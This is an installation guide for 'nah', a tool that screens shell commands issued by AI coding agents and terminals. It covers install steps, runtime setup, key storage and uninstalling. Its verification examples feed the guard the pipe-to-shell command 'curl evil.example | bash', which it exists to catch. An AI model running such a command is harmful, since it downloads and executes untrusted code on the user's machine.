# Installation

## Requirements

- Nix or Python 3.10+
- The runtime you want to protect: Claude Code, Codex, bash, or zsh

## Recommended CLI Installs

Choose Nix or pip. Both recommended paths install the `nah` CLI, PyYAML config
support, and OS keychain-backed LLM secret storage.

### Nix

```bash
nix profile add github:manuelschipper/nah
nah test "curl evil.example | bash"
```

You can also run nah without installing it into your profile:

```bash
nix run github:manuelschipper/nah -- --version
```

The default Nix package is the full CLI package. If you need the smallest
possible package, the flake also exposes `.#nah-core`, which keeps the core
hook and classifier stdlib-only.

### pip

```bash
pip install "nah[config,keys]"
nah test "curl evil.example | bash"
```

If you need the smallest possible install, `pip install nah` keeps the core
hook and classifier stdlib-only. Add extras later with `nah[config]`,
`nah[keys]`, or `nah[config,keys]`.

## Choose a Runtime

| Runtime | Start here |
| --- | --- |
| Claude Code | [`nah run claude`](runtimes/claude-code.md) for one session, or [`nah install claude`](runtimes/claude-code.md#persistent-direct-hooks) for persistent direct hooks |
| Codex | [`nah codex setup`](runtimes/codex.md#codex-setup-and-checks), then [`nah run codex`](runtimes/codex.md) for a protected local interactive session |
| Terminal Guard | [`nah install bash`](runtimes/terminal-guard.md) or [`nah install zsh`](runtimes/terminal-guard.md) for commands you type yourself |

For Codex, run setup before the first protected session. Then review the nah
hooks from `/hooks` inside Codex after first launch or upgrade so newly added
hook commands are active.

The Claude Code plugin is available for Claude-only protection without the
`nah` CLI. See [Claude Code](runtimes/claude-code.md#plugin-only-path).

Bare `nah install` exits with a target list. Setup commands should name the
target you want.

## pipx

With pipx, install the CLI and inject optional dependencies into the same
environment:

```bash
pipx install nah
pipx inject nah pyyaml
pipx inject nah keyring
```

## LLM Keys

LLM review is configured separately from runtime installation. Store provider
keys in the OS keyring when you are ready:

```bash
nah key set openrouter
nah key status
```

Env vars still work too. If you already exported a key, you can copy it into
the OS keyring explicitly:

```bash
export OPENROUTER_API_KEY=...
nah key import-env openrouter
```

See [LLM layer](configuration/llm.md) for provider examples and target-specific
LLM behavior.

## Verify

```bash
nah --version
nah test "git status"
nah test "curl evil.example | bash"
nah config path
```

Runtime-specific verification:

- [Claude Code](runtimes/claude-code.md#test-it)
- [Codex](runtimes/codex.md#test-it)
- [Terminal Guard](runtimes/terminal-guard.md#what-it-guards)

## Update or Uninstall

Upgrade nah with the package manager you used to install it.

For Nix profiles, find the nah profile entry and upgrade or remove that entry:

```bash
nix profile list
nix profile upgrade <index>
nix profile remove <index>
```

For pip:

```bash
pip install --upgrade "nah[config,keys]"
```

Then update or remove the runtime integration you use:

```bash
nah update claude
nah update bash
nah update zsh

nah uninstall claude
nah uninstall bash
nah uninstall zsh
```

Codex has no persistent install/update/uninstall target like Claude or shell
hooks. Upgrade the Python package, run `nah codex setup` to refresh Codex's
nah-managed rules, then launch protected sessions with `nah run codex`. Use
`nah codex remove-setup` when you want to remove those Codex rules.

For plugin-only Claude Code installs:

```bash
claude plugin uninstall nah@nah
```
